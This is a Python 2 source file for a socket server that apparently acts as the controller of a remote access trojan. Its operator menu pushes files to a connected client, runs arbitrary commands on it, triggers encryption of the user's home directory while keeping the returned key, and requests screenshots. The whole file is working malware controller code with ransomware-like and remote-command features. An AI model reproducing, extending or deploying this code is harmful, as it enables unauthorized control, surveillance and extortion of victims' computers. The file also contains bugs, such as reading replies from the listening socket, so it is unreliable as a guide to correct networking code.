'''
Created on Mar 2, 2015

@author: gcharan09
'''
import socket
import os
from Tkinter import Tk
import time
from tkFileDialog import askopenfilename
from Crypto.PublicKey import RSA
import pickle
from Crypto.Cipher import PKCS1_OAEP 
from base64 import b64decode

class pyserver:
    
    def __init__(self):
        
        self.host="localhost"
        self.port=12345    
        try:
            self.sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except KeyboardInterrupt:
            raise
        except socket.error:
            print "unable to create socket"
        try:
            self.sock.bind((self.host,self.port))
            self.sock.listen(1)
        except KeyboardInterrupt:
            raise
        except socket.gaierror:
            print "Unable to bind to host:port kindly check"
        print "Socket created and server listening on :"+str(self.host)+":"+str(self.port)
    
    def __genKey(self):
        self.RSAKey=RSA.generate(2048,e=65537)
        return self.RSAKey
    
    def __exchangeKeys(self):
        self.__genKey()
        print "Connected to the client"+str(self.clientsock.getpeername())+"exchanging the public keys\n"
        self.clientsock.sendall(pickle.dumps(self.RSAKey.publickey(),None))
        print "sent the pubKey\n"
        buf = self.clientsock.recv(2048)
        print "received ClientKey\n"
        clientKey=pickle.loads(buf)
        with open("clientKey",'wb') as f:
            f.write(clientKey.exportKey())
        print "loaded key successfully\n"
        return clientKey
    
    def acceptConn(self):
        while 1:
            try:
                self.clientsock, clientaddr = self.sock.accept()
                self.__exchangeKeys()
                print "got connection from ", self.clientsock.getpeername()
                self.operations()
            except KeyboardInterrupt:
                raise
            except Exception:
                pass
    
    def operations(self):
        
        while True:
            ip=raw_input("select the operation to perform\n\n1-send file\n2-execute command\n3-encrypt_user_home\n4-screenshot\n5-Quit\n\n")
            if ip=='1':
                Tk().withdraw()
                print "Browse the file you want to send"
                filename = askopenfilename()
                filecontent=open(filename,'rb').read()
                self.sendData('FT')
                time.sleep(0.1)
                self.sendData(filecontent)
            elif ip=='2':
                self.sendData("CMD")
                cmd=raw_input("enter the cmd to be executed\n")
                self.sendData(cmd)
            elif ip=='3':
                print"encrypting user home directory\n"
                self.sendData('EFS')
                self.sendData('QUIT')
                key=self.receiveData()
                print key
                with open("EFS_Key",'wb')as f:
                    f.write(key)
            elif ip=='4':
                self.sendData("SCP")
            elif ip=='5':
                print "Closing the connection to client"
                break
            else:
                print "please enter a valid input"
                
    def receiveData(self):
        while 1:
            buf = self.sock.recv(4096)
            if buf:
                encmessage = b64decode(pickle.loads(buf))
                msg= PKCS1_OAEP.new(self.RSAKey).decrypt(encmessage)
                msg=msg.strip('~')
                return msg
            else:
                print "client closed connection"
                break
        self.sock.close()
                
    def sendData(self, data):
        key = open("clientKey", "r").read() 
        clientKey= RSA.importKey(key)
        clientKey = PKCS1_OAEP.new(clientKey)
        if(len(data)>100):
            print "sending large data"
            for i in range(100,len(data),100):
                secretText = clientKey.encrypt(data[i-100:i])
                time.sleep(0.5)
                self.clientsock.sendall(pickle.dumps(secretText.encode('base64')))
            secretText=clientKey.encrypt(data[(i):len(data)])
            time.sleep(0.5)
            self.clientsock.sendall(pickle.dumps(secretText.encode('base64')))
            print "sent large data"
        else:
            print "sending small data"
            while len(data)<100:
                data+='~'
            print data
            secretText=clientKey.encrypt(data)
            self.clientsock.sendall(pickle.dumps(secretText.encode('base64')))
            print "sent small data"

if __name__ == '__main__':
    try:
        sockObj=pyserver()
        sockObj.acceptConn()
    except KeyboardInterrupt:
            raise
    except Exception as e:
        print e